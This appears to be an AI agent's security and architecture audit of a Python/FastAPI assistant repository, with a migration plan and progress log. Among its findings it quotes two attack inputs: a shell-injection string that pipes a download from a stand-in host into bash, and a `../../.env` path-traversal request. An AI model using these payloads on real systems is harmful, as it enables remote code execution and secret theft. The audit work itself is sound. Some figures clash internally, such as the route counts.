# JARVIS V5 → V6 Audit

Date: 2026-08-19
Scope: full repository (`core/` 111 files/~16.4k lines, `services/` 111 files/~17.6k lines, `server/` 39 files/~6.5k lines, plus `config/`, `utils/`, `deploy/`, root scripts).

## 0. Headline findings (act on these regardless of V6 timeline)

1. **Unauthenticated arbitrary file read.** `GET /stark/voice/audio` (`server/routes/voice.py:256-293`) has no auth dependency and builds a filesystem path directly from an unsanitized `?file=` query param before serving it with `FileResponse`. Anyone who can reach the API can request `?file=../../.env` and read secrets off the server. This is the single most severe finding in the audit.
2. **Live-shaped credential committed to git.** `mcp_config.json` (tracked, not gitignored) hardcodes what looks like a real bearer token for `JARVIS_API_TOKEN` — the master credential gating the whole API — plus a local absolute path leaking the developer's OS username. Treat as compromised; rotate `JARVIS_API_TOKEN` and scrub the file to read from env.
3. **Shell-injection primitive.** `core/tools/system.py:102-114` (`run_shell`) allowlists by `command.startswith(prefix)` but then runs the full, unmodified string via `subprocess.run(command, shell=True, ...)`. `"ls; curl evil/x|bash"` passes the prefix check. Reachable from the LLM-driven `run_shell` tool via `/stark/task`.
4. **AppleScript injection.** `core/tools/mac.py` escapes quotes in most functions but not in `quit_app()`, `focus_app()`, `is_app_running()`, or `create_reminder()`'s `title` — an app name/title containing `"` breaks out of the AppleScript string.
5. **Unauthenticated phone/SMS webhook.** `server/routes/stark_infrastructure.py:46-72` (`/stark/phone/call`, `/respond`, `/transcribed`, `/sms`) has no Twilio signature verification, unlike the equivalent endpoint in `final_features.py`. Anyone can POST and reach the LLM pipeline.
6. **CORS wildcard + credentials.** `ALLOWED_ORIGINS` defaults to `"*"` with `allow_credentials=True` (`config/settings.py:325`, `utils/security.py:202-204`) — a combination browsers/Starlette handle by reflecting the request Origin, defeating the intent of the wildcard.
7. **Stray tracked artifacts.** A root file literally named `n` is a 12KB zip archive of an old source snapshot, accidentally committed. `logs/immutable_audit.jsonl` is tracked in git and shipped into Docker images despite containing real chat content (a recipient email, a Gmail message ID) — the `.gitignore`/`.dockerignore` rules exclude `*.json`/`*.log` but not `.jsonl`.

None of these require the V6 rewrite to fix — they're small, surgical patches. I'd like to patch #1, #3, #4, #5, #6, and the `.jsonl` ignore gap now, and get your call on #2 (token rotation) and #7 (dropping `n` from history) since those touch git history / credentials outside my ability to rotate. Details below; see §9 for the plan.

## 1. Current architecture

- **Entry**: `app.py` → `uvicorn` → `server/api.py` (916-line FastAPI app). Boots defensively: the health router has an inline fallback if its import fails, and all other routers go through `_safe_import()` so one broken module doesn't take down boot. Docs (`/docs`, `/redoc`) are disabled outside `ENVIRONMENT=local` (a documented fix for a prior incident).
- **Request path**: `server/routes/*.py` (36 files, ~473 registered routes) and `server/websocket.py` (`/ws/chat`, now properly token-gated after a documented past incident where it had zero auth) both ultimately call into `core/brain_v2.py`.
- **The real cognitive pipeline is `core/brain_v2.py`** (1808 lines) — a monolith that defines its own `Intent → Validate → Plan → Execute` pipeline internally, duplicating what standalone `core/reasoning.py`, `core/validator.py`, `core/planner.py`, `core/executor.py`, `core/orchestrator.py` attempt separately. Those standalone modules are real and wired, but only reachable through opt-in `/stark/*` and `/mythos/*` side-door endpoints — never the default chat path. This is explicitly self-documented in the code (`core/orchestrator.py:8-13`, `core/agentic_loop.py:5-13`): "deliberately NOT wired into Brain.process()."
- **Model routing**: `core/llm/router.py` (885 lines) — a procedural hub with module-level mutable state (usage counters, response cache) that classifies queries into tiers and dispatches to `core/llm/{openai,cerebras,ollama,anthropic_client}.py`, each with its own ad-hoc `chat()` signature (no shared provider interface). A cleaner but unused sketch of a provider abstraction (`Provider` enum, `RouteResult`) already exists in `core/llm/cascade.py` — nothing calls it.
- **Memory**: `core/memory.py` (814 lines, the real system: short/long-term, facts, embeddings, compression) backed by `core/turso_store.py` (a documented, intentional persistence helper, not a competitor). `core/working_memory.py` and `core/persistence.py` are smaller and effectively unused.
- **Tools**: `core/tools/*` (browser, files, gmail, calendar, mac, search, spotify, system, vision, voice, web) plus `core/executor.py`'s dict-based dispatch table — the best-shaped piece of the existing "router" trio, though handlers are free functions with no schema/validation, not a `Tool` interface.
- **services/** (111 files) is a wide, largely non-overlapping set of integrations, automations, and security utilities. 106 of 111 are genuinely wired and used; only 4 files (~475 lines) are dead. Despite Iron-Man-flavored names (`combat_mode`, `defcon`, `gold_codes`, `stark_security`, `suit_assembly`...), nearly all of it is real functionality, not roleplay stubs — see §4.
- **Auth**: one shared `verify_token` dependency (`utils/security.py`, constant-time compare) applied per-router almost everywhere, with `protocols.py`/`sandbox.py` layering additional master-only and biometric-confirmation tiers for the most dangerous operations (lockdown, self-modification deploy). This is a genuinely solid defense-in-depth pattern already present in V5 — worth preserving in V6's permission model rather than replacing.
- **Global state**: 40+ bare module-level singletons across `core/` (`bus = EventBus()`, `brain = Brain()`, etc.), consumed via direct import-and-mutate rather than dependency injection. Circular imports are avoided almost entirely via lazy, function-local imports rather than clean module boundaries — a deliberate but fragile workaround that hides the real dependency graph.

## 2. Major subsystems (as they exist today, not as named in folders)

| Subsystem | Where | Status |
|---|---|---|
| Cognitive pipeline (intent/plan/execute) | `core/brain_v2.py` | Live, monolithic |
| Reasoning-strategy zoo (ToT, ReAct, GoT, self-consistency, reflexion, multi-agent, + ~20 single-technique modules) | `core/*.py` | Real, wired, but side-door only via `orchestrator.py` and opt-in routes |
| Model routing | `core/llm/router.py` | Live but procedural; `cascade.py` is an unused cleaner sketch |
| Memory | `core/memory.py` + `core/turso_store.py` | Live, coherent |
| Tool execution | `core/tools/*` + `core/executor.py` | Live, reasonable dispatch table, no schema layer |
| Agentic loop | `core/agentic_loop.py` | Side-door; parses free-text `THINK:`/`ACTION:` markers rather than structured tool-calling — inconsistent with `core/tool_calling.py` |
| Sandbox / self-modification | `core/sandbox.py` + `server/routes/sandbox.py` + `core/self_analysis.py` | Genuinely solid approval/audit scaffolding (multi-factor gate, backup, allowlist deploy); execution isolation itself is subprocess-only, no container/seccomp — self-documented limitation |
| Security/threat cluster | `services/{sentinel,siem,threat_detector,threat_intel,breach_monitor,red_team}.py` | 5 distinct, non-duplicate systems; `siem.py` is the canonical aggregator |
| Crypto cluster | `services/{crypto_security,quantum_crypto,zero_knowledge}.py` | All real implementations, none wired as primary auth; two are dead code (unimported) |
| Automation/scheduling | `services/{scheduler,predictive_scheduling,automation,autonomous_handler}.py` | 4 distinct responsibilities, not copies |
| Remote control | `services/{remote_control,mac_bridge}.py`, `services/mcp_server.py` | Real control of the user's actual Mac over Tailscale/ngrok; token-gated |
| Route layer | `server/routes/*.py` (36 files) | Sprawling but mostly distinct feature batches, not wholesale duplicates — two genuine route collisions found (§3) |

## 3. Duplicate / overlapping systems

- **`core/brain.py` (dead, 87 lines) vs `core/brain_v2.py` (live, 1808 lines)** — `brain.py` is an older, self-contained pipeline superseded by `brain_v2.py`. Safe to delete.
- **`GET /stark/memory/facts` registered twice**: `server/routes/memory.py:15` and `server/routes/brain_enhancement.py:124-125` (a semantic-search variant). Because `memory_router` registers first, FastAPI resolves it — `brain_enhancement.py`'s handler is unreachable dead code today.
- **`/stark/security/audit`** defined with different HTTP methods in `security_max.py` (POST, fresh audit) and `stark_infrastructure.py` (GET, cached result) — not a routing conflict but confusingly overlapping naming; worth consolidating.
- **`core/llm/cascade.py` vs `core/llm/router.py`** — `cascade.py` sketches a cleaner `Provider`/`RouteResult` abstraction than the procedural `router.py`, but is entirely unused. V6's `LLMProvider` interface should absorb `cascade.py`'s shape into `router.py`'s actual routing logic rather than starting from scratch.
- **`core/orchestrator.py` / `core/executor.py` / `core/agentic_loop.py` vs `core/brain_v2.py`** — the standalone trio is the closest existing analog to a classify→strategy→execute router, but `brain_v2.py` reimplements a parallel, simpler version of the same idea internally rather than using them. V6 should formalize one of these, not both.
- Everything else that looked like a naming collision on first pass (`threat_detector` vs `threat_intel` vs `sentinel` vs `siem`; `crypto_security` vs `quantum_crypto` vs `zero_knowledge`; `audit_log` vs `self_audit`; `scheduler` vs `predictive_scheduling` vs `automation` vs `autonomous_handler`; `morning_routine` vs `evening_routine`) turned out on inspection to be **deliberately distinct systems**, most with docstrings explicitly explaining why they aren't duplicates. No consolidation needed there beyond possibly grouping by subdirectory for discoverability.

## 4. Dead / unused code

Confirmed by whole-repo import grep, not filename guessing:

- `core/brain.py`, `core/emotional_simulation.py`, `core/ensemble.py`, `core/hierarchical_planning.py`, `core/persistence.py`
- `services/audio_intel.py`, `services/crypto_security.py`, `services/quantum_crypto.py`, `services/side_channel.py` (its one useful function, `constant_time_compare`, is reimplemented inline in `utils/security.py` instead of imported)
- `core/llm/cascade.py` (unused, but worth reviving rather than deleting — see §3)
- `core/working_memory.py` is nearly unused (1 external reference)

`services/mcp_server.py` shows zero importers but is **not dead** — it's a standalone entry point run separately (`python3 services/mcp_server.py`) for Claude Desktop's MCP integration. Flagging so it isn't deleted by mistake.

Total confirmed dead: ~9 files, roughly 1,500–2,000 lines. Small relative to the ~40k-line codebase — this is not a codebase full of cruft, it's a codebase with a handful of superseded files and a large number of legitimate-but-side-door features.

## 5. Security concerns (full list; §0 has the six most severe)

| Finding | Location | Severity |
|---|---|---|
| Unauthenticated path traversal / arbitrary file read | `server/routes/voice.py:256-293` | Critical |
| Live credential committed to git | `mcp_config.json:7` | Critical |
| Shell injection via prefix-only allowlist + `shell=True` | `core/tools/system.py:102-114` | High |
| AppleScript injection (unescaped quotes) | `core/tools/mac.py` (`quit_app`, `focus_app`, `is_app_running`, `create_reminder`) | High |
| Unauthenticated phone/SMS webhook, no Twilio signature check | `server/routes/stark_infrastructure.py:46-72` | High |
| Arbitrary file read via LLM code-review tool, no base-dir restriction | `services/dev_intel.py:93-125`, reachable via `server/routes/new_features.py:127-142` | Medium-High (token-gated, but unrestricted path) |
| CORS wildcard + `allow_credentials=True` | `config/settings.py:325`, `utils/security.py:202-204` | Medium |
| SSH `StrictHostKeyChecking=no` to reach user's Mac | `services/remote_control.py:38` | Medium (scoped to Tailscale network) |
| `ufw`-based firewall mutation with unvalidated IP format | `services/stark_security.py:100-107` | Low (list-args, not shell; currently unwired to any route) |
| `os.system()` with f-string path interpolation | `services/voice.py:133` | Low (path is server-generated today, not user input) |
| Rate limiting only on one endpoint (60s/60req), sophisticated adaptive limiter exists but unwired | `utils/security.py:194-200`, `services/adaptive_ratelimit.py` | Low-Medium |
| Tracked `.jsonl` audit log with real chat content shipped in Docker image | `logs/immutable_audit.jsonl` | Medium (data exposure, not RCE) |

No hardcoded secrets found anywhere in `core/`, `services/`, `server/`, or `utils/` beyond the `mcp_config.json` token — every other credential is loaded via `os.getenv`/`config.settings` with empty-string defaults that fail open for genuinely optional integrations, and fail closed for the sandbox self-modification token specifically. `resurrection.py` (disaster-recovery identity/memory restore via Shamir secret sharing) is a manually-run CLI tool, not an autonomous self-modification path — it prints recovered keys to stdout for manual `.env` pasting, which is a minor shoulder-surfing/shell-history risk but not a structural one.

## 6. Technical debt (non-security)

- One 1808-line monolith (`brain_v2.py`) holding the entire cognitive pipeline, duplicating smaller standalone modules that already do the same job in isolation.
- 40+ bare module-level singletons, consumed by direct import-and-mutate — no dependency injection anywhere.
- Circular imports avoided via lazy, function-local imports rather than explicit module boundaries — hides the true dependency graph from static tooling.
- No shared `Tool`/`LLMProvider`/`ReasoningStrategy` interfaces — every "strategy" or "provider" is an independent class/function with its own ad-hoc shape.
- `agentic_loop.py` parses free-text `THINK:`/`ACTION:`/`COMPLETE:` markers instead of using the structured tool-calling already implemented in `core/tool_calling.py` — fragile, inconsistent with the rest of the codebase.
- Websocket (`server/websocket.py`) re-implements lockdown/threat-classification/validation logic in parallel to `server/routes/chat.py` instead of sharing it — the inline comments document this already caused a real lockdown-bypass bug once.
- `core/sandbox.py` is self-documented as process-isolation-only with a static banned-import string scan, not a real OS-level sandbox — fine as a v1, but should not be assumed to contain a truly adversarial coding agent.

## 7. Recommended architecture

The proposed `jarvis/{app,cognitive,memory,agents,tools,perception,integrations,security,runtime,ui,tests}/` layout from the directive maps reasonably cleanly onto what exists, with these adjustments based on what the audit found:

- `cognitive/router/` = formalize `core/orchestrator.py`'s classify-and-dispatch shape, but make it the *only* path (replace `brain_v2.py`'s internal reimplementation, don't run both).
- `cognitive/reasoning/` = give every existing strategy module (ToT, ReAct, GoT, self-consistency, reflexion, multi-agent, + the ~20 single-technique modules) one shared `ReasoningStrategy` interface; keep the modules, wrap them, retire the string-keyed dispatch.
- `cognitive/planning/` = `core/planner.py` + `core/hierarchical_planning.py` (currently dead — revive under the interface or drop; audit didn't find a reason it's unused beyond nothing calling it yet).
- `cognitive/verification/` = new; nothing in V5 does structured plan→execute→observe→verify today, `core/validator.py` is the closest but validates input, not outcomes.
- `cognitive/uncertainty/` = merge `bayesian.py`, `epistemic.py`, `uncertainty.py` behind one `Decision`/confidence interface — currently three adjacent but disconnected modules.
- `memory/` = `core/memory.py` + `core/turso_store.py` split along the working/episodic/semantic/procedural lines the directive wants; this is real restructuring, not just a folder move, since `memory.py` currently mixes all of these together.
- `agents/` = `core/agents/{coder,researcher,planner_agent,deep_research}.py` already exist and roughly match; give them a shared `Agent.run()` interface.
- `tools/registry/` + `tools/permissions/` = new; wrap `core/executor.py`'s dispatch table and `core/tools/*` with the `Tool(name, risk_level, requires_confirmation, ...)` schema the directive specifies. This is the single highest-leverage new piece — it directly fixes the shell-injection and arbitrary-file-read findings by making risk/permission a declared property of every tool instead of ad hoc per-function checks.
- `security/` = mostly exists already (`utils/security.py`, `services/sentinel.py`, `services/siem.py`, the master/biometric tiers in `protocols.py`/`sandbox.py`) — consolidate rather than rebuild.
- `runtime/events/` = `core/event_bus.py` already exists and is used; keep.
- `integrations/` = `core/tools/{gmail,google_calendar,spotify,mac}.py` + `services/{mac_bridge,remote_control,home_automation}.py`.

## 8. Risk assessment

- **Highest risk of the whole migration**: collapsing `brain_v2.py` into the new router without breaking the ~473 existing routes that call into it, given how much side-door reasoning logic already assumes `brain_v2.py`'s specific dataclasses. This needs an adapter/shim period, not a flag-day cutover.
- **Second highest**: the tool permission system, because it's genuinely new (nothing in V5 declares risk level per tool) and touches every code path that currently calls `core/executor.py` or `core/tools/*` directly.
- **Lowest risk, do first**: the six items in §0 — none require touching the cognitive pipeline, all are independently testable, and three are active vulnerabilities.
- **Irreversible/needs your input before I act**: rotating `JARVIS_API_TOKEN` (I don't know if the committed value is still live in any deployment), and scrubbing `n` / `mcp_config.json` / `logs/immutable_audit.jsonl` from git history (rewriting history is disruptive to any existing clones/PRs and you should decide whether that's warranted vs. just fixing HEAD going forward).

## 9. Proposed phased plan

1. **Phase 0 — critical security patches** ✅ done (PR #5): fixed the unauthenticated file read, the shell-injection allowlist, AppleScript quote escaping, the phone/SMS webhook auth, CORS wildcard+credentials, and the `.jsonl` gitignore/dockerignore gap. Deleted the confirmed-dead files (§4). No architectural change.
2. **Phase 1 — interfaces** ✅ done: introduced `ReasoningStrategy`, `LLMProvider`, `Tool`, `Agent` protocols in `core/interfaces/`, without moving any files; adapted existing modules to implement them in place. See §11 for exactly what this did and didn't cover.
3. **Phase 2 — Cognitive Router**: build the router using `orchestrator.py`'s classify-and-dispatch as the base, wire it as the *only* entry point, retire `brain_v2.py`'s internal duplicate pipeline behind it.
4. **Phase 3 — Tool Registry + permissions**: wrap `core/tools/*`/`core/executor.py` with risk-level/confirmation metadata; this is what actually closes the shell-injection and arbitrary-file-read *classes* of bug, not just the two instances found today.
5. **Phase 4 — Verification Engine**: new subsystem; needed before autonomy/self-improvement phases mean anything.
6. **Phase 5 — Memory unification**: split `core/memory.py` into working/episodic/semantic/procedural.
7. **Phase 6 — Agent standardization**: shared `Agent.run()` over the existing four agents.
8. **Phase 7 — Security hardening pass 2**: consolidate the security/crypto clusters under `security/`, wire the adaptive rate limiter, replace `core/sandbox.py`'s process-only isolation if real containerization is available in the target deploy environment.
9. **Phase 8 — Observability + testing + benchmark suite**.
10. **Phase 9 — Deprecation cleanup**: remove what Phase 1-8 superseded, once nothing depends on it.

Each phase ends with tests run, regressions fixed, docs updated, and a report of what changed — per the directive's rules.

## 10. What I need from you before proceeding

- ~~OK to execute Phase 0 now~~ — done, see §11.
- ~~Committed token in `mcp_config.json`~~ — resolved: removed from HEAD, switched to placeholder; token rotation (if needed) is the user's, wherever `JARVIS_API_TOKEN` is actually issued.
- ~~Pacing for Phases 1-9~~ — resolved: proceed phase-by-phase, checkpoint before Phase 2's router cutover and before final deprecation/deletion.

## 11. Progress log

### Phase 1 — interfaces (done)

Added `core/interfaces/{reasoning,llm_provider,tool,agent}.py` — four protocols (`ReasoningStrategy`, `LLMProvider`, `Tool`, `Agent`), each with a lazily-built registry. Every existing module kept its original functions/classes and every existing caller (`core/orchestrator.py`, `server/routes/*.py`, `core/tool_calling.py`, ...) is untouched and still the live code path — these are purely additive adapter classes appended to the bottom of each file:

- **ReasoningStrategy** (8 strategies): `DirectStrategy` (new, lives in the interface module itself — no existing module for the trivial single-call case), plus adapters in `core/reasoning.py` (`ChainOfThoughtStrategy`, `VerifiedReasoningStrategy`), `core/react.py` (`ReActStrategy`), `core/tree_of_thought.py` (`TreeOfThoughtStrategy`), `core/graph_of_thought.py` (`GraphOfThoughtStrategy`), `core/self_consistency.py` (`SelfConsistencyStrategy`), `core/multi_agent.py` (`MixtureOfAgentsStrategy`). `core/reflexion.py` deliberately has no adapter — it's a lesson-store/evaluator, not a query-answering strategy, and doesn't fit the interface.
- **LLMProvider** (4 providers): adapters in `core/llm/openai.py` (`GroqProvider`), `core/llm/cerebras.py` (`CerebrasProvider`), `core/llm/ollama.py` (`OllamaProvider`), `core/llm/anthropic_client.py` (`AnthropicProvider`). `core/llm/router.py` (the real routing/fallback/caching logic) and `core/llm/cascade.py` (the unused sketch) are both untouched.
- **Tool** (9 tools): `core/executor.py` gained a `TOOLS: dict[str, Tool]` registry over its existing dispatch table, with risk-level/confirmation/reversibility/permissions metadata per tool. `execute_step()` itself is untouched — nothing enforces this metadata yet (see below).
- **Agent** (4 agents): adapters in `core/agents/coder.py` (`CoderAgent`), `core/agents/researcher.py` (`ResearcherAgent`), `core/agents/planner_agent.py` (`PlannerAgentAdapter`), `core/agents/deep_research.py` (`DeepResearchTaskAgent`, preserving its fire-and-forget/poll semantics — `run()` returns once the background research thread starts, not once the report is ready).

**Verified** (clean venv, full dependency install): app boots with all 46 routes registered, no import regressions. All 4 registries build and `isinstance`-check correctly. All 8 reasoning strategies' `solve()` and all 4 providers' `generate()` were called end-to-end through real async execution — with no API keys configured in the verification environment they degraded exactly the way the rest of the codebase already does (`[JARVIS OFFLINE]` / clear exceptions naming the missing key), never crashing at the interface layer. `Tool.execute()` was run for real (`system_info`, `read_file`). Both `CoderAgent.run()` and `DeepResearchTaskAgent.run()` were run for real, including `success=False` correctly propagating when generated code fails its syntax check.

**Explicitly not done in Phase 1** (deferred to the phases named in §9, not overlooked):
- No permission/confirmation *enforcement* — `Tool.requires_confirmation`/`risk_level` are declared but nothing checks them before a tool runs. That's Phase 3.
- Tool coverage is only `core/executor.py`'s 9 tools, not `core/tools/mac.py`/`gmail.py`/`google_calendar.py`/`spotify.py`/etc., and not reconciled with `core/tool_calling.py`'s separate `TOOLS_SCHEMA` (which uses different names for overlapping concepts, e.g. `system_info` vs `get_system_status`). Also Phase 3.
- No routing changes — `core/orchestrator.py` still dispatches by its own `if/elif` on `query_type`, not through the new registries. That's Phase 2.
